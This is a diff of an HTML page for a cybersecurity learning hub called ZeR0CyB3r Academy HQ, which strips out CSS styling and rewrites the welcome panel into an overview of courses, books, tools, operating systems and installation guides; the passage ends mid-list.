-      background: rgba(255, 0, 56, 0.08);
-      border-left: 3px solid var(--crimson-primary);
-      padding: 10px 14px;
-      margin: 12px 0;
-      color: #f1f5f9;
-    }
-    .terminal-quick-actions {
-      background: #0d121a;
-      border-top: 1px solid rgba(255, 255, 255, 0.06);
-      padding: 12px 18px;
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      flex-wrap: wrap;
-    }
-    .term-btn {
-      font-family: var(--font-mono);
-      font-size: 11px;
-      font-weight: 700;
-      color: #cbd5e1;
-      background: rgba(255, 255, 255, 0.04);
-      border: 1px solid rgba(255, 255, 255, 0.12);
-      padding: 6px 12px;
-      border-radius: var(--radius-sm);
-      cursor: pointer;
-      transition: var(--transition);
-      display: inline-flex;
-      align-items: center;
-      gap: 6px;
-    }
-    .term-btn:hover {
-      color: #ffffff;
-      background: rgba(255, 0, 56, 0.15);
-      border-color: var(--crimson-primary);
-    }
-    .term-btn.active {
-      color: #ffffff;
-      background: var(--crimson-primary);
-      border-color: var(--crimson-primary);
-    }
-
-    .welcome-clean-notice {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      background: rgba(255, 0, 56, 0.06);
-      border: 1px solid rgba(255, 0, 56, 0.25);
-      border-radius: var(--radius-sm);
-      padding: 14px 20px;
-      gap: 16px;
-      flex-wrap: wrap;
-    }
-
-    .welcome-clean-notice-text {
-      font-size: 13px;
-      color: var(--text-secondary);
-      line-height: 1.5;
-    }
-
-    .welcome-clean-notice-text strong {
-      color: #ffffff;
-    }
-
-    .welcome-clean-actions {
-      display: flex;
-      align-items: center;
-      gap: 8px;
-      flex-wrap: wrap;
-    }
-
-    /* Split Filter Bar: Left Categories + Right Installation Action */
-    .hub-filter-bar-split {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      gap: 12px;
-      flex-wrap: wrap;
-    }
-
-    .hub-filter-tabs-left {
-      display: flex;
-      align-items: center;
-      gap: 8px;
-      flex-wrap: wrap;
-    }
-
-    .hub-filter-tabs-right {
-      display: flex;
-      align-items: center;
-      gap: 8px;
-    }
-
-    .hub-btn-guides-highlight {
-      background: rgba(255, 0, 56, 0.12) !important;
-      border: 1px solid rgba(255, 0, 56, 0.45) !important;
-      color: #ffffff !important;
-      font-weight: 700 !important;
-      box-shadow: 0 0 14px rgba(255, 0, 56, 0.2);
-    }
-
-    .hub-btn-guides-highlight:hover,
-    .hub-btn-guides-highlight.active {
-      background: var(--crimson-primary) !important;
-      border-color: var(--crimson-primary) !important;
-      color: #ffffff !important;
-      box-shadow: 0 0 20px var(--crimson-glow) !important;
-    }
-
-    .hub-section-indicator-badge {
-      font-family: var(--font-mono);
-      font-size: 10px;
-      font-weight: 800;
-      color: var(--crimson-light);
-      background: rgba(255, 0, 56, 0.12);
-      border: 1px solid rgba(255, 0, 56, 0.3);
-      padding: 3px 8px;
-      border-radius: 4px;
-      letter-spacing: 0.08em;
-      text-transform: uppercase;
-    }
-
-    .hub-filter-btn {
-      font-family: var(--font-mono);
-      font-size: 12px;
-      font-weight: 600;
-      padding: 8px 14px;
-      border-radius: var(--radius-sm);
-      background: rgba(255, 255, 255, 0.03);
-      border: 1px solid var(--border-card);
-      color: var(--text-secondary);
-      cursor: pointer;
-      display: inline-flex;
-      align-items: center;
-      gap: 6px;
-      transition: var(--transition);
-      user-select: none;
-    }
-
-    .hub-filter-btn:hover {
-      background: rgba(255, 0, 56, 0.08);
-      border-color: rgba(255, 0, 56, 0.3);
-      color: var(--text-primary);
-    }
-
-    .hub-filter-btn.active {
-      background: var(--crimson-primary);
-      border-color: var(--crimson-primary);
-      color: #fff;
-      box-shadow: 0 0 12px var(--crimson-glow);
-    }
-
-    .hub-filter-count {
-      font-size: 10px;
-      background: rgba(0, 0, 0, 0.4);
-      padding: 2px 6px;
-      border-radius: 10px;
-      margin-left: 2px;
-    }
-
-    .hub-results-meta {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      font-family: var(--font-mono);
-      font-size: 12px;
-      color: var(--text-muted);
-      border-top: 1px solid rgba(255, 255, 255, 0.05);
-      padding-top: 12px;
-    }
-
-    /* Resources Grid */
-    .hub-grid {
-      display: grid;
-      grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
-      gap: 20px;
-      margin-bottom: 60px;
-    }
-
-    .hub-card {
-      background: var(--bg-card);
-      border: 1px solid var(--border-card);
-      border-radius: var(--radius-md);
-      padding: 22px;
-      display: flex;
-      flex-direction: column;
-      justify-content: space-between;
-      position: relative;
-      transition: var(--transition);
-      overflow: hidden;
-    }
-
-    .hub-card:hover {
-      border-color: var(--crimson-glow);
-      background: var(--bg-card-hover);
-      transform: translateY(-4px);
-      box-shadow: 0 12px 28px rgba(0, 0, 0, 0.6), 0 0 16px rgba(255, 0, 56, 0.15);
-    }
-
-    .hub-card::before {
-      content: '';
-      position: absolute;
-      top: 0;
-      left: 0;
-      right: 0;
-      height: 2px;
-      background: linear-gradient(90deg, transparent, var(--crimson-primary), transparent);
-      opacity: 0;
-      transition: var(--transition);
-    }
-
-    .hub-card:hover::before {
-      opacity: 1;
-    }
-
-    .hub-card-header {
-      display: flex;
-      align-items: flex-start;
-      justify-content: space-between;
-      gap: 12px;
-      margin-bottom: 12px;
-    }
-
-    .hub-cat-badge {
-      font-family: var(--font-mono);
-      font-size: 10px;
-      font-weight: 700;
-      letter-spacing: 0.08em;
-      text-transform: uppercase;
-      padding: 4px 10px;
-      border-radius: var(--radius-sm);
-      display: inline-flex;
-      align-items: center;
-      gap: 6px;
-    }
-
-    .cat-books { background: rgba(59, 130, 246, 0.15); border: 1px solid rgba(59, 130, 246, 0.35); color: #60a5fa; }
-    .cat-tools { background: rgba(239, 68, 68, 0.15); border: 1px solid rgba(239, 68, 68, 0.35); color: #f87171; }
-    .cat-os { background: rgba(16, 185, 129, 0.15); border: 1px solid rgba(16, 185, 129, 0.35); color: #34d399; }
-    .cat-videos { background: rgba(168, 85, 247, 0.15); border: 1px solid rgba(168, 85, 247, 0.35); color: #c084fc; }
-    .cat-cheatsheets { background: rgba(245, 158, 11, 0.15); border: 1px solid rgba(245, 158, 11, 0.35); color: #fbbf24; }
-
-    .hub-card-bookmark-btn {
-      background: none;
-      border: none;
-      color: var(--text-muted);
-      cursor: pointer;
-      font-size: 16px;
-      transition: var(--transition);
-      padding: 4px;
-    }
-
-    .hub-card-bookmark-btn:hover {
-      color: #fbbf24;
-      transform: scale(1.15);
-    }
-
-    .hub-card-bookmark-btn.bookmarked {
-      color: #fbbf24;
-    }
-
-    .hub-card-title {
-      font-size: 18px;
-      font-weight: 700;
-      color: var(--text-primary);
-      margin-bottom: 8px;
-      display: flex;
-      align-items: center;
-      gap: 8px;
-    }
-
-    .hub-card-title i {
-      color: var(--crimson-light);
-      font-size: 16px;
-    }
-
-    .hub-card-desc {
-      font-size: 13px;
-      color: var(--text-secondary);
-      line-height: 1.55;
-      margin-bottom: 16px;
-    }
-
-    .hub-code-preview {
-      background: rgba(0, 0, 0, 0.6);
-      border: 1px solid rgba(255, 255, 255, 0.05);
-      border-radius: var(--radius-sm);
-      padding: 8px 12px;
-      font-family: var(--font-mono);
-      font-size: 11px;
-      color: #38bdf8;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      margin-bottom: 16px;
-      overflow-x: auto;
-    }
-
-    .hub-code-preview span {
-      white-space: nowrap;
-      overflow: hidden;
-      text-overflow: ellipsis;
-    }
-
-    .hub-copy-inline-btn {
-      background: none;
-      border: none;
-      color: var(--text-muted);
-      cursor: pointer;
-      font-size: 12px;
-      padding: 2px 6px;
-      transition: var(--transition);
-    }
-
-    .hub-copy-inline-btn:hover {
-      color: #fff;
-    }
-
-    .hub-card-tags {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 6px;
-      margin-bottom: 18px;
-    }
-
-    .hub-tag-pill {
-      font-family: var(--font-mono);
-      font-size: 10px;
-      color: var(--text-muted);
-      background: rgba(255, 255, 255, 0.03);
-      border: 1px solid rgba(255, 255, 255, 0.05);
-      border-radius: 4px;
-      padding: 2px 8px;
-    }
-
-    .hub-card-actions {
-      display: flex;
-      align-items: center;
-      gap: 8px;
-      margin-top: auto;
-    }
-
-    .hub-btn-action {
-      flex: 1;
-      display: inline-flex;
-      align-items: center;
-      justify-content: center;
-      gap: 6px;
-      font-family: var(--font-mono);
-      font-size: 12px;
-      font-weight: 700;
-      padding: 9px 14px;
-      border-radius: var(--radius-sm);
-      text-decoration: none;
-      transition: var(--transition);
-      cursor: pointer;
-    }
-
-    .hub-btn-primary {
-      background: var(--crimson-primary);
-      border: 1px solid var(--crimson-primary);
-      color: #fff;
-    }
-
-    .hub-btn-primary:hover {
-      background: var(--crimson-dark);
-      box-shadow: 0 0 14px var(--crimson-glow);
-    }
-
-    .hub-btn-secondary {
-      background: rgba(255, 255, 255, 0.04);
-      border: 1px solid var(--border-card);
-      color: var(--text-secondary);
-    }
-
-    .hub-btn-secondary:hover {
-      background: rgba(255, 255, 255, 0.08);
-      color: var(--text-primary);
-      border-color: rgba(255, 255, 255, 0.2);
-    }
-
-    /* Modal Styling */
-    .hub-modal-overlay {
-      position: fixed;
-      inset: 0;
-      background: rgba(0, 0, 0, 0.85);
-      backdrop-filter: blur(8px);
-      z-index: 2000;
-      display: none;
-      align-items: center;
-      justify-content: center;
-      padding: 20px;
-    }
-
-    .hub-modal-overlay.active {
-      display: flex;
-    }
-
-    .hub-modal-box {
-      background: #0d1117;
-      border: 1px solid rgba(255, 0, 56, 0.4);
-      border-radius: var(--radius-lg);
-      width: 100%;
-      max-width: 680px;
-      max-height: 85vh;
-      overflow-y: auto;
-      padding: 28px;
-      position: relative;
-      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.9), 0 0 30px rgba(255, 0, 56, 0.25);
-    }
-
-    .hub-modal-close {
-      position: absolute;
-      top: 20px;
-      right: 20px;
-      background: none;
-      border: 1px solid var(--border-card);
-      border-radius: 50%;
-      width: 32px;
-      height: 32px;
-      color: var(--text-secondary);
-      cursor: pointer;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      transition: var(--transition);
-    }
-
-    .hub-modal-close:hover {
-      background: var(--crimson-primary);
-      color: #fff;
-      border-color: var(--crimson-primary);
-    }
-
-    /* Toast Notification */
-    .hub-toast {
-      position: fixed;
-      bottom: 24px;
-      right: 24px;
-      background: #18181b;
-      border: 1px solid var(--crimson-primary);
-      color: var(--text-primary);
-      padding: 12px 20px;
-      border-radius: var(--radius-md);
-      font-family: var(--font-mono);
-      font-size: 13px;
-      display: none;
-      align-items: center;
-      gap: 10px;
-      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.8), 0 0 20px var(--crimson-glow);
-      z-index: 9999;
-    }
-
-    .hub-toast.show {
-      display: flex;
-      animation: slideUpToast 0.3s ease-out;
-    }
-
-    @keyframes slideUpToast {
-      from { transform: translateY(20px); opacity: 0; }
-      to { transform: translateY(0); opacity: 1; }
-    }
-
-    /* Installation & Use Guide Console Styling */
-    .guides-hero-banner {
-      background: linear-gradient(135deg, rgba(20, 24, 33, 0.95) 0%, rgba(13, 17, 23, 0.98) 100%);
-      border: 1px solid rgba(255, 0, 56, 0.35);
-      border-radius: var(--radius-lg);
-      padding: 24px 28px;
-      margin-bottom: 28px;
-      box-shadow: 0 12px 32px rgba(0, 0, 0, 0.5), 0 0 20px rgba(255, 0, 56, 0.12);
-    }
-
-    .guides-hero-header {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      gap: 16px;
-      flex-wrap: wrap;
-      margin-bottom: 12px;
-    }
-
-    .guides-quick-chips {
-      display: flex;
-      align-items: center;
-      gap: 8px;
-      flex-wrap: wrap;
-      margin-top: 14px;
-    }
-
-    .guide-chip {
-      background: rgba(0, 0, 0, 0.5);
-      border: 1px solid var(--border-card);
-      border-radius: 20px;
-      padding: 6px 13px;
-      font-family: var(--font-mono);
-      font-size: 11px;
-      color: var(--text-secondary);
-      cursor: pointer;
-      transition: var(--transition);
-      display: inline-flex;
-      align-items: center;
-      gap: 6px;
-      white-space: nowrap;
-    }
-
-    .guide-chip:hover {
-      background: rgba(255, 0, 56, 0.15);
-      border-color: var(--crimson-primary);
-      color: #fff;
-      transform: translateY(-1px);
-    }
-
-    .hub-guide-card {
-      background: var(--bg-card);
-      border: 1px solid var(--border-card);
-      border-radius: var(--radius-md);
-      padding: 22px;
-      display: flex;
-      flex-direction: column;
-      justify-content: space-between;
-      transition: var(--transition);
-      position: relative;
-      overflow: hidden;
-    }
-
-    .hub-guide-card:hover {
-      border-color: var(--crimson-glow);
-      background: var(--bg-card-hover);
-      transform: translateY(-3px);
-      box-shadow: 0 16px 36px rgba(0, 0, 0, 0.7), 0 0 20px rgba(255, 0, 56, 0.2);
-    }
-
-    .hub-guide-card::before {
-      content: '';
-      position: absolute;
-      top: 0;
-      left: 0;
-      right: 0;
-      height: 3px;
-      background: linear-gradient(90deg, #ff0038, #ff4d6d, #b30027);
-    }
-
-    .guide-platform-badges {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 6px;
-      margin: 12px 0;
-    }
-
-    .guide-platform-pill {
-      font-family: var(--font-mono);
-      font-size: 9.5px;
-      font-weight: 700;
-      padding: 3px 8px;
-      border-radius: 4px;
-      background: rgba(255, 255, 255, 0.05);
-      border: 1px solid rgba(255, 255, 255, 0.1);
-      color: var(--text-secondary);
-    }
-
-    .guide-platform-pill.highlight {
-      background: rgba(16, 185, 129, 0.15);
-      border-color: rgba(16, 185, 129, 0.35);
-      color: #34d399;
-    }
-
-    .guide-specs-box {
-      background: rgba(0, 0, 0, 0.45);
-      border: 1px solid rgba(255, 255, 255, 0.06);
-      border-radius: var(--radius-sm);
-      padding: 10px 12px;
-      font-family: var(--font-mono);
-      font-size: 11px;
-      color: var(--text-muted);
-      margin-bottom: 16px;
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 6px;
-    }
-
-    /* Interactive Guide Modal Box */
-    .guide-modal-box {
-      max-width: 880px !important;
-      width: 95% !important;
-      max-height: 88vh !important;
-    }
-
-    .guide-tabs-nav {
-      display: flex;
-      gap: 6px;
-      border-bottom: 1px solid var(--border-card);
-      padding-bottom: 12px;
-      margin-bottom: 20px;
-      overflow-x: auto;
-    }
-
-    .guide-tab-btn {
-      background: rgba(255, 255, 255, 0.03);
-      border: 1px solid var(--border-card);
-      border-radius: var(--radius-sm);
-      padding: 8px 14px;
-      font-family: var(--font-mono);
-      font-size: 11.5px;
-      color: var(--text-secondary);
-      cursor: pointer;
-      transition: var(--transition);
-      display: inline-flex;
-      align-items: center;
-      gap: 6px;
-      white-space: nowrap;
-    }
-
-    .guide-tab-btn:hover {
-      background: rgba(255, 0, 56, 0.1);
-      color: #fff;
-    }
-
-    .guide-tab-btn.active {
-      background: var(--crimson-primary);
-      border-color: var(--crimson-primary);
-      color: #fff;
-      font-weight: 700;
-      box-shadow: 0 0 12px var(--crimson-glow);
-    }
-
-    .guide-step-card {
-      background: rgba(255, 255, 255, 0.02);
-      border: 1px solid rgba(255, 255, 255, 0.06);
-      border-radius: var(--radius-md);
-      padding: 16px;
-      margin-bottom: 14px;
-      position: relative;
-    }
-
-    .guide-step-header {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      margin-bottom: 8px;
-    }
-
-    .guide-step-num {
-      width: 24px;
-      height: 24px;
-      border-radius: 50%;
-      background: var(--crimson-primary);
-      color: #fff;
-      display: inline-flex;
-      align-items: center;
-      justify-content: center;
-      font-family: var(--font-mono);
-      font-size: 11px;
-      font-weight: 800;
-      flex-shrink: 0;
-    }
-
-    .guide-step-title {
-      font-size: 14.5px;
-      font-weight: 700;
-      color: #fff;
-    }
-
-    .guide-code-box {
-      background: #000;
-      border: 1px solid rgba(255, 255, 255, 0.12);
-      border-radius: var(--radius-sm);
-      padding: 12px 14px;
-      font-family: var(--font-mono);
-      font-size: 12px;
-      color: #38bdf8;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      gap: 12px;
-      margin-top: 10px;
-      overflow-x: auto;
-    }
-
-    .guide-copy-btn {
-      background: rgba(255, 255, 255, 0.1);
-      border: 1px solid rgba(255, 255, 255, 0.18);
-      color: #fff;
-      border-radius: 4px;
-      padding: 4px 10px;
-      font-family: var(--font-mono);
-      font-size: 10.5px;
-      cursor: pointer;
-      display: inline-flex;
-      align-items: center;
-      gap: 4px;
-      transition: var(--transition);
-      white-space: nowrap;
-      flex-shrink: 0;
-    }
-
-    .guide-copy-btn:hover {
-      background: var(--crimson-primary);
-      border-color: var(--crimson-primary);
-    }
-  </style>
+  
 </head>
 <body>
 
-  <!-- Ambient Crimson Atmosphere (Consistent with Portfolio & Login) -->
+  <!-- Ambient Crimson Atmosphere -->
   <div class="top-highlight-line"></div>
   <div class="glow-blob blob-1"></div>
   <div class="glow-blob blob-2"></div>
   <div class="glow-blob blob-3"></div>
   <div class="glow-blob blob-4"></div>
 
-  <!-- Top Hub Navigation Bar (Unified with index.html & login.html Design System) -->
+  <!-- Top Hub Navigation Bar (All Study Access Lives Here) -->
   <header class="site-header hub-site-header" id="top">
     <div class="hub-header-container">
       <a href="index.html" class="brand" title="Return to ZeR0CyB3r Portfolio &amp; Engagements">
@@ -1987,7 +43,7 @@
         </div>
       </a>
 
-      <!-- Direct Header Navigation: Academy HQ, Courses, Books, Tools, OS, Installation & Use -->
+      <!-- Direct Header Navigation -->
       <nav class="hub-nav-wrap" aria-label="Cyber Security Academy Navigation">
         <ul class="hub-nav-links">
           <li>
@@ -2036,511 +92,413 @@
           <span class="pulsing-dot"></span>
           <span id="hubOperatorName">OPERATOR CLEARANCE</span>
         </div>
-        <button type="button" class="hub-logout-action-btn" id="hubLogoutBtn" onclick="handleHubLogout()" title="Terminate current operator session">
+        <a href="index.html" class="hub-logout-action-btn" id="hubLogoutBtn" onclick="handleHubLogout(event)" title="Terminate current operator session">
           <i class="fa-solid fa-right-from-bracket"></i>
           <span>LOG OUT</span>
-        </button>
+        </a>
       </div>
     </div>
   </header>
 
-  <!-- Main Content Container -->
-  <main class="container" style="padding-top: 94px;">
-    
-    <!-- Welcome & Student/Beginner Overview: Academy HQ Command Deck -->
-    <section class="hub-welcome-panel" id="hubWelcomePanel">
-      <div class="welcome-top-meta">
-        <div class="welcome-badge">
-          <i class="fa-solid fa-satellite-dish text-crimson"></i>
-          <span>// CENTRAL ORIENTATION GATEWAY // RECRUIT &amp; OPERATOR CLEARANCE // ZERO-SEARCH DOCTRINE</span>
-        </div>
-        <div class="status-badge" style="padding: 4px 12px; font-size: 10.5px;">
-          <span class="pulsing-dot"></span>
-          <span id="welcomeOperatorBadge">OPERATOR ACTIVE</span>
-        </div>
-      </div>
+  <!-- Main Application Body -->
+  <main class="container hub-main-container">
 
-      <div class="welcome-hero-content">
-        <h1 class="welcome-title">
-          Welcome to ZeR0<span class="text-crimson">CyB3r</span> Study Launchpad
+    <!-- ==========================================================================
+         ACADEMY HQ: INFORMATION & CAPABILITIES BLUEPRINT
+         (Strictly Informational: Explains what is provided & how to navigate)
+         Order: Defensive Operations -> Cloud & Architecture -> Offensive Operations
+         ========================================================================== -->
+    <div id="hubWelcomePanel" class="hq-dossier-wrapper">
+
+      <!-- Sleek Master Status Bar (Operational Blueprint) -->
+      <div class="hq-hero-banner">
+        <div class="hq-top-status-row">
+          <div class="hq-dossier-tag">
+            <i class="fa-solid fa-shield-halved"></i>
+            <span>ACADEMY HQ // OPERATIONAL BLUEPRINT &bull; MISSION DIRECTIVE</span>
+          </div>
+          <div class="hq-telemetry-pill">
+            <i class="fa-solid fa-circle hq-telemetry-dot"></i>
+            <span>AUTHENTICATED: <span id="welcomeOperatorBadge">OPERATOR</span></span>
+          </div>
+        </div>
+
+        <h1 class="hq-hero-title">
+          Cyber Security <span>Operations &amp; Learning Hub</span>
         </h1>
-        
-        <p class="section-main-desc" style="font-size: 15px; color: #cbd5e1; margin-bottom: 22px;">
-          The Single-Source Cybersecurity &amp; Ethical Hacking Doctrine &bull; Zero Fragmentation. Zero Commercial Distractions.
+
+        <p class="hq-hero-desc">
+          ZeR0CyB3r Academy HQ serves as an end-to-end tactical command center and intelligence repository engineered for cybersecurity practitioners, ethical hackers, and defensive analysts. From hardware-level security internals to cloud hyper-scale hardening and offensive red-team tradecraft, this platform unifies actionable toolkits, technical reference literature, and hands-on laboratory environments.
         </p>
 
-        <!-- Operator Directive Callout Box -->
-        <div class="hub-directive-box">
-          <div class="hub-directive-title">
-            <i class="fa-solid fa-terminal text-crimson"></i>
-            <span>// OPERATOR DIRECTIVE &bull; WHY THIS HUB EXISTS</span>
-          </div>
-          <div class="hub-directive-content">
-            <p>
-              Every aspiring security researcher and ethical hacker faces the same brutal paradox: <strong>information overload paired with total directionless fragmentation.</strong> Countless beginner hours are wasted scouring dead forum threads, fragmented YouTube playlists, outdated exploit writeups, and monetized paywalls that obscure what truly matters.
-            </p>
-            <p>
-              <strong>ZeR0CyB3r Hub eliminates the search noise.</strong> All weaponized tools, declassified books, pre-configured ISO operating systems, virtualization step-by-step guides, and full video syllabi already exist neatly classified in your top navigation header. You do not need 30 open browser tabs. You only need this roadmap, your dedicated terminal, and an uncompromising commitment to fundamental computing mastery.
-            </p>
-          </div>
-        </div>
-
-        <!-- 4 Curation & Telemetry Badges -->
-        <div class="curation-badges-grid">
-          <div class="curation-badge-card">
-            <span class="status-dot green"></span>
-            <div>
-              <div class="curation-badge-title">CURATION: 100% Curated</div>
-              <div class="curation-badge-sub">Zero ads, trackers or paywalls</div>
+        <!-- Operational Blueprint Key Pillars -->
+        <div class="hq-blueprint-specs">
+          <div class="hq-spec-item">
+            <div class="hq-spec-icon"><i class="fa-solid fa-bullseye text-crimson"></i></div>
+            <div class="hq-spec-content">
+              <span class="hq-spec-title">PRIMARY MISSION</span>
+              <span class="hq-spec-val">Bridge the gap between theoretical security concepts and real-world tactical execution.</span>
             </div>
           </div>
-          <div class="curation-badge-card">
-            <span class="status-dot green"></span>
-            <div>
-              <div class="curation-badge-title">METHODOLOGY: 5-Phase Path</div>
-              <div class="curation-badge-sub">Zero-to-Hero technical framework</div>
+          <div class="hq-spec-item">
+            <div class="hq-spec-icon"><i class="fa-solid fa-microchip text-crimson"></i></div>
+            <div class="hq-spec-content">
+              <span class="hq-spec-title">TECHNICAL ARCHITECTURE</span>
+              <span class="hq-spec-val">Curated repositories covering Network Forensics, VAPT, Active Directory, and Cloud DevSecOps.</span>
             </div>
           </div>
-          <div class="curation-badge-card">
-            <span class="status-dot"></span>
-            <div>
-              <div class="curation-badge-title">TOP ARSENAL: Unified Nav</div>
-              <div class="curation-badge-sub">Instant 1-click classified resources</div>
-            </div>
-          </div>
-          <div class="curation-badge-card">
-            <span class="status-dot green"></span>
-            <div>
-              <div class="curation-badge-title">LEARNING MODE: Lab-Driven</div>
-              <div class="curation-badge-sub">Offensive &amp; Defensive VAPT</div>
+          <div class="hq-spec-item">
+            <div class="hq-spec-icon"><i class="fa-solid fa-terminal text-crimson"></i></div>
+            <div class="hq-spec-content">
+              <span class="hq-spec-title">TACTICAL WORKFLOW</span>
+              <span class="hq-spec-val">100% verified setup manuals, copy-paste terminal commands, and zero-fluff field guides.</span>
             </div>
           </div>
         </div>
 
-        <!-- Section 1: Master Strategic Curriculum (5-Phase Zero-to-Hero Roadmap) -->
-        <div style="margin-bottom: 36px;">
-          <div class="section-eyebrow-tag">
+        <!-- Directive Callout -->
+        <div class="hq-doctrine-box" style="margin-top: 14px;">
+          <div class="hq-doctrine-header">
+            <i class="fa-solid fa-compass text-crimson"></i>
+            <span>HOW TO ACCESS ACADEMY RESOURCES</span>
+          </div>
+          <div class="hq-doctrine-text">
+            All downloadable tools, curated video courses, technical manuals, hardened operating systems, and deployment guides are organized in the <strong>Top Navigation Bar</strong>. Select any tab above (<strong>Courses</strong>, <strong>Books &amp; PDFs</strong>, <strong>Tools</strong>, <strong>Operating Systems</strong>, or <strong>Installation &amp; Use</strong>) to browse, filter, inspect, and launch assets.
+          </div>
+        </div>
+      </div>
+
+      <!-- What We Provide & Capabilities Matrix -->
+      <div class="hq-section-head" style="margin-top: 4px;">
+        <div class="hq-eyebrow">
+          <i class="fa-solid fa-cubes-stacked text-crimson"></i>
+          <span>ECOSYSTEM CAPABILITIES</span>
+        </div>
+        <h2 class="hq-heading">What We Provide</h2>
+        <p class="hq-subtext">
+          A full-spectrum repository providing everything necessary to build labs, master defensive analysis, and conduct authorized penetration assessments.
+        </p>
+      </div>
+
+      <div class="hq-bento-grid">
+        <!-- 1. Video Masterclasses -->
+        <div class="hq-bento-card">
+          <div>
+            <div class="hq-bento-top">
+              <span class="hq-bento-badge">CURATED TRAINING</span>
+              <i class="fa-solid fa-play-circle hq-bento-icon"></i>
+            </div>
+            <h3 class="hq-bento-title">Structured Video Courses</h3>
+            <p class="hq-bento-desc">
+              Comprehensive masterclasses covering SOC triage, network forensics, Active Directory attacks, web application pentesting, and cloud security architecture.
+            </p>
+            <ul class="hq-bento-list">
+              <li><i class="fa-solid fa-angle-right"></i> Real-world offensive &amp; defensive methodologies</li>
+              <li><i class="fa-solid fa-angle-right"></i> Certified training roadmaps for security analysts</li>
+              <li><i class="fa-solid fa-angle-right"></i> Hands-on lab execution walk-throughs</li>
+            </ul>
+          </div>
+          <div class="hq-bento-footer-stat">
+            <span>REPOSITORY ACCESS</span>
+            <span>TOP NAV &bull; COURSES</span>
+          </div>
+        </div>
+
+        <!-- 2. Technical Books & Manuals -->
+        <div class="hq-bento-card">
+          <div>
+            <div class="hq-bento-top">
+              <span class="hq-bento-badge">DEEP THEORY</span>
+              <i class="fa-solid fa-book-open hq-bento-icon"></i>
+            </div>
+            <h3 class="hq-bento-title">Reference Books &amp; Documentation</h3>
+            <p class="hq-bento-desc">
+              Authoritative literature spanning low-level operating system internals, cryptography, malware reverse engineering, and threat modeling frameworks.
+            </p>
+            <ul class="hq-bento-list">
+              <li><i class="fa-solid fa-angle-right"></i> Foundational computer science &amp; protocol depth</li>
+              <li><i class="fa-solid fa-angle-right"></i> Incident response &amp; forensics field manuals</li>
+              <li><i class="fa-solid fa-angle-right"></i> Penetration tester blueprint guides</li>
+            </ul>
+          </div>
+          <div class="hq-bento-footer-stat">
+            <span>REPOSITORY ACCESS</span>
+            <span>TOP NAV &bull; BOOKS &amp; PDFS</span>
+          </div>
+        </div>
+
+        <!-- 3. Security Tools Arsenal -->
+        <div class="hq-bento-card">
+          <div>
+            <div class="hq-bento-top">
+              <span class="hq-bento-badge">FIELD ARSENAL</span>
+              <i class="fa-solid fa-wrench hq-bento-icon"></i>
+            </div>
+            <h3 class="hq-bento-title">Security Tools &amp; Utilities</h3>
+            <p class="hq-bento-desc">
+              Curated security software for reconnaissance, packet capture, exploit orchestration, password cracking, and vulnerability scanning.
+            </p>
+            <ul class="hq-bento-list">
+              <li><i class="fa-solid fa-angle-right"></i> Industry-standard network analyzers &amp; scanners</li>
+              <li><i class="fa-solid fa-angle-right"></i> Proxy interception &amp; web API testing suites</li>
+              <li><i class="fa-solid fa-angle-right"></i> Terminal installation strings &amp; verify commands</li>
+            </ul>
+          </div>
+          <div class="hq-bento-footer-stat">
+            <span>REPOSITORY ACCESS</span>
+            <span>TOP NAV &bull; TOOLS</span>
+          </div>
+        </div>
+
+        <!-- 4. Hardened Operating Systems -->
+        <div class="hq-bento-card">
+          <div>
+            <div class="hq-bento-top">
+              <span class="hq-bento-badge">PLATFORMS</span>
+              <i class="fa-solid fa-desktop hq-bento-icon"></i>
+            </div>
+            <h3 class="hq-bento-title">Hardened Operating Systems</h3>
+            <p class="hq-bento-desc">
+              Specialized security-focused operating distributions tailored for adversary simulation, digital forensics, privacy, and defensive isolation.
+            </p>
+            <ul class="hq-bento-list">
+              <li><i class="fa-solid fa-angle-right"></i> Offensive distributions preloaded with penetration tools</li>
+              <li><i class="fa-solid fa-angle-right"></i> Forensics workstations for artifact extraction &amp; memory analysis</li>
+              <li><i class="fa-solid fa-angle-right"></i> Anonymized and privacy-hardened live kernels</li>
+            </ul>
+          </div>
+          <div class="hq-bento-footer-stat">
+            <span>REPOSITORY ACCESS</span>
+            <span>TOP NAV &bull; OS</span>
+          </div>
+        </div>
+
+        <!-- 5. Deployment Guides -->
+        <div class="hq-bento-card">
+          <div>
+            <div class="hq-bento-top">
+              <span class="hq-bento-badge">LAB WORKSHOPS</span>
+              <i class="fa-solid fa-screwdriver-wrench hq-bento-icon"></i>
+            </div>
+            <h3 class="hq-bento-title">Installation &amp; Use Manuals</h3>
+            <p class="hq-bento-desc">
+              Step-by-step verified installation walkthroughs, terminal setup commands, configuration parameters, and practical usage procedures.
+            </p>
+            <ul class="hq-bento-list">
+              <li><i class="fa-solid fa-angle-right"></i> Package manager &amp; source build instructions</li>
+              <li><i class="fa-solid fa-angle-right"></i> Environment hardening &amp; prerequisite setups</li>
+              <li><i class="fa-solid fa-angle-right"></i> Verification commands &amp; live test flags</li>
+            </ul>
+          </div>
+          <div class="hq-bento-footer-stat">
+            <span>REPOSITORY ACCESS</span>
+            <span>TOP NAV &bull; INSTALLATION</span>
+          </div>
+        </div>
+
+        <!-- 6. Specialization Mastery -->
+        <div class="hq-bento-card">
+          <div>
+            <div class="hq-bento-top">
+              <span class="hq-bento-badge">CAREER TRACKS</span>
+              <i class="fa-solid fa-graduation-cap hq-bento-icon"></i>
+            </div>
+            <h3 class="hq-bento-title">Specialization Pathways</h3>
+            <p class="hq-bento-desc">
+              Three clear career trajectories detailing technical capabilities, role requirements, and foundational knowledge needed for cybersecurity roles.
+            </p>
+            <ul class="hq-bento-list">
+              <li><i class="fa-solid fa-angle-right"></i> Defensive Operations &amp; SOC Incident Response</li>
+              <li><i class="fa-solid fa-angle-right"></i> Cloud Security &amp; DevSecOps Engineering</li>
